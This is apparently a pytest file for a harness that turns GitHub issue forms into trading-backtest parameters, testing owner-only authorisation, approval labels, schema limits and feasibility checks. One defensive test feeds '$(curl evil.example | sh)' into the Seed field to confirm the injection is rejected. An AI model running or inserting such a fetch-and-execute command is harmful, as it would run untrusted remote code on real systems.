from harness.core import config
from harness.intake import decide
from harness.issueform import sections, to_params

BODY = """### Seed

7

### Symbols

6

### Trading days

1512

### Regime mix

balanced

### Strategies

- [X] Trend following
- [ ] Mean reversion
- [X] Volatility breakout

### Fee (bps)

1

### Slippage (bps)

5

### Walk-forward train days

504

### Walk-forward test days

126

### Holdout fraction

0.2
"""


def event(action="opened", author="mrrishit909", sender=None, body=BODY, labels=("type:run",), label=None):
    ev = {
        "action": action,
        "repository": {"owner": {"login": "mrrishit909"}},
        "sender": {"login": sender or author},
        "issue": {"number": 12, "state": "open", "user": {"login": author}, "body": body,
                  "labels": [{"name": n} for n in labels]},
    }
    if label:
        ev["label"] = {"name": label}
    return ev


def test_sections_handles_no_response():
    assert sections("### A\n\n_No response_\n\n### B\n\nx\n") == {"A": None, "B": "x"}


def test_owner_request_dispatches_with_exact_params():
    d = decide(event())
    assert d["action"] == "dispatch"
    assert d["params"]["strategies"] == ["trend", "breakout"]
    assert d["params"]["dataset"] == {"kind": "synthetic", "seed": 7, "symbols": 6, "days": 1512,
                                      "regime_mix": "balanced"}
    assert d["params"]["allow_short"] is False


def test_non_owner_is_blocked_even_with_labels():
    d = decide(event(author="someone-else", labels=("type:run", "job:requested", "job:approved")))
    assert d["action"] == "blocked"


def test_approval_label_only_counts_from_owner():
    assert decide(event(action="labeled", author="x", sender="x", label="job:approved"))["action"] == "blocked"
    assert decide(event(action="labeled", author="x", sender="mrrishit909", label="job:approved"))["action"] == "dispatch"


def test_injection_text_is_rejected_not_echoed():
    body = BODY.replace("### Seed\n\n7", "### Seed\n\n$(curl evil.example | sh)")
    d = decide(event(body=body))
    assert d["action"] == "invalid"
    assert all("curl" not in e for e in d["errors"])


def test_out_of_range_values_fail_schema():
    d = decide(event(body=BODY.replace("### Symbols\n\n6", "### Symbols\n\n99")))
    assert d["action"] == "invalid"
    assert any("symbols" in e for e in d["errors"])


def test_unknown_checkbox_option_is_invalid():
    params, errors = to_params(BODY.replace("Volatility breakout", "Martingale"), config()["form"],
                               config()["constants"])
    assert errors


def test_issue_without_run_label_is_ignored():
    assert decide(event(labels=()))["action"] == "ignore"


def test_infeasible_combination_is_rejected_before_dispatch():
    body = BODY.replace("### Trading days\n\n1512", "### Trading days\n\n1008").replace(
        "### Holdout fraction\n\n0.2", "### Holdout fraction\n\n0.25")
    d = decide(event(body=body))
    assert d["action"] == "invalid"
    assert any(e.startswith("walk_forward:") for e in d["errors"])
